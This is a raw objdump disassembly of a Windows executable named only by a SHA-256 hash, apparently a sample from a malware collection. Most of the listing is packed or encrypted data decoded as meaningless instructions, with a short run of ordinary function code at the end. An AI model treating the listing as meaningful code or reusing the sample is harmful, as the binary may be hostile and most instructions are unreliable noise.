
05f4d85297492c16077b867c6a5716ce48f78d38d0e66b64cdd7bb41a2cb2376.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    esp,0x26e076f1
  4d0005:	push   ss
  4d0006:	mov    WORD PTR [eax],?
  4d0008:	out    dx,al
  4d0009:	pop    edi
  4d000a:	xchg   BYTE PTR [eax+edx*2-0x5b],bl
  4d000e:	out    0x51,eax
  4d0010:	es xor al,0xbb
  4d0013:	lahf   
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d06b3
  4d06c1:	aas    
  4d06c2:	(bad)  
  4d06c3:	xchg   esi,eax
  4d06c4:	dec    esp
  4d06c5:	inc    esi
  4d06c6:	mov    bl,0xcd
  4d06c8:	gs inc ebx
  4d06ca:	es pop ebx
  4d06cc:	nop
  4d06cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d06ce:	cmp    dl,BYTE PTR [ebx-0x66ed7ff9]
  4d06d4:	cs aad 0x79
  4d06d7:	jecxz  0x4d0756
  4d06d9:	add    eax,0x4f68da6b
  4d06de:	or     bl,bl
  4d06e0:	jecxz  0x4d0709
  4d06e2:	dec    edx
  4d06e3:	xchg   DWORD PTR [ebx],edx
  4d06e5:	nop
  4d06e6:	cdq    
  4d06e7:	loopne 0x4d0686
  4d06e9:	add    ch,BYTE PTR [eax+0x15ff5ffd]
  4d06ef:	add    BYTE PTR [eax],ah
  4d06f1:	dec    ebp
  4d06f2:	add    bh,bh
  4d06f4:	xlat   BYTE PTR ds:[ebx]
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d2010
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0709:	sub    esp,0x2c
  4d070c:	mov    ecx,0x4d31a0
  4d0711:	or     DWORD PTR [ecx-0xd0],0x6c
  4d0718:	push   ecx
  4d0719:	push   edx
  4d071a:	push   DWORD PTR [ecx+0xa0]
  4d0720:	call   0x4d1278
  4d0725:	add    esp,0x8
  4d0728:	pop    ecx
  4d0729:	push   ecx
  4d072a:	mov    esi,0x0
  4d072f:	push   esi
  4d0730:	call   0x4d1104
  4d0735:	add    esp,0x4
  4d0738:	pop    ecx
  4d0739:	push   ecx
  4d073a:	mov    edx,0x0
  4d073f:	push   edx
  4d0740:	call   0x4d13bc
  4d0745:	add    esp,0x4
  4d0748:	pop    ecx
  4d0749:	add    esp,0x2c
  4d074c:	pop    ebp
  4d074d:	ret    
  4d074e:	add    BYTE PTR [eax],al
  4d0750:	mov    edi,edi
  4d0752:	push   ebp
  4d0753:	mov    ebp,esp
  4d0755:	sub    esp,0x58
  4d0758:	mov    edi,0x4d30b0
  4d075d:	or     esi,0x4ecc
  4d0763:	push   edi
  4d0764:	push   esi
  4d0765:	push   DWORD PTR [edi+0x80]
  4d076b:	push   DWORD PTR [edi+0x20]
  4d076e:	push   edx
  4d076f:	call   0x4d14a4
  4d0774:	add    esp,0x10
  4d0777:	pop    edi
  4d0778:	push   edi
  4d0779:	push   0x0
  4d077b:	call   0x4d0eb4
  4d0780:	add    esp,0x4
  4d0783:	pop    edi
  4d0784:	mov    ebx,0x4d2044
  4d0789:	mov    ebx,DWORD PTR [ebx]
  4d078b:	push   ebx
